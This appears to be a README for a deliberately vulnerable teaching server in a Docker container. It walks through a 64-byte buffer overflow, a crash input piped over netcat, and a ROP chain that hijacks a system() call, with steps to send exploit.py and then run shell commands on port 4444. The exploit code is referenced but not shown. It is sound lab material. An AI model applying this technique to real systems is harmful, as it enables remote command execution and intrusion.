Demonstrates buffer overrun. Server has 64 byte buffer, but copies up to 1024
bytes, by mistake, into the buffer.


To build the image and run it

```
docker build -t vuln-server .
```

Run it interactively, login

```
docker run --rm -it -p 4444:4444 -p 8080:8080 vuln-server /bin/bash
```

Then run

```
./server
```

To connect, try

```
echo "Hello" | nc localhost 8080
```

To crash the server

```
python3 -c "print('A'*100)" | nc localhost 8080
```

Use `objdump -d server` to see dump of the instructions. We found the address
of the `cleanup_temp_dir()` function, and also various assembly instruction
addresses to use to form a return of procedure (ROP) attach chain.

With help of Gemini to fill in gap about how program execution works, we know
we can send the following to trick the server to run the cleanup_temp_dir
function, and replace the `system` call argument with something we send over.
Take a look at `exploit.py`.

To enable the attack

  * Start the server in the container
  * On attacker computer, run `(python3 exploit.py) | nc localhost 8080`
  * On attacker computer, run `nc localhost 4444`, and enter a shell command, like "id"
